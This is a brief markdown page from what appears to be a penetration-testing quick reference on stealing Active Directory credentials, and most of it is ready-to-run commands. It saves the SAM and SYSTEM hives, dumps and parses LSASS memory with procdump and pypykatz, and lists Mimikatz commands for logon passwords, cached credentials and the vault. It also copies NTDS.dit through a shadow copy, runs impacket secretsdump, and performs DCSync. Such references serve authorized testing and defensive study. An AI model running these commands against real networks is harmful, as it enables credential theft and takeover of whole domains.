# AD credential access

[← Active Directory quick reference](../05-active-directory.md) · [Windows token rights](../windows/token-groups.md) · [Potato](../windows/potato.md)

Confirm local administrator, SYSTEM, backup, debug, or replication rights before a dump. A low-privilege domain login alone does not grant access to SAM, LSASS, or NTDS.

## Local SAM and LSA

With the right local access, save SAM and SYSTEM for offline parsing:

```cmd
reg save HKLM\SAM C:\Temp\sam.save
reg save HKLM\SYSTEM C:\Temp\system.save
```

```bash
impacket-secretsdump -sam sam.save -system system.save LOCAL
nxc smb <target-ip> -u <admin-user> -p '<password>' --sam --lsa
impacket-secretsdump -hashes :<nt-hash> '<domain.tld>/<admin-user>@<target-ip>'
```

## LSASS and cached material

A confirmed debug or SYSTEM path can inspect LSASS. Keep a dump offline where possible:

```cmd
procdump -accepteula -ma lsass.exe C:\Temp\lsass.dmp
```

```bash
pypykatz lsa minidump lsass.dmp
```

Mimikatz commands when that tool is the selected method:

```text
privilege::debug
sekurlsa::logonpasswords
sekurlsa::ekeys
lsadump::sam
lsadump::cache
vault::cred
```

## DC database or replication

`SeBackupPrivilege` can permit an offline NTDS copy through a volume snapshot. Verify the privilege, snapshot drive, and path before copying:

```cmd
diskshadow /s C:\Temp\dsh.txt
robocopy /b X:\Windows\NTDS C:\Temp\ ntds.dit
reg save HKLM\SYSTEM C:\Temp\system.save
```

```bash
impacket-secretsdump -ntds ntds.dit -system system.save LOCAL
```

DCSync is a different path and needs directory replication rights:

```bash
impacket-secretsdump -just-dc <domain.tld>/<user>:<password>@<dc-ip>
```

Use [lateral movement](lateral-movement.md) only after matching the recovered account or NT hash to a reachable service and its authorization.
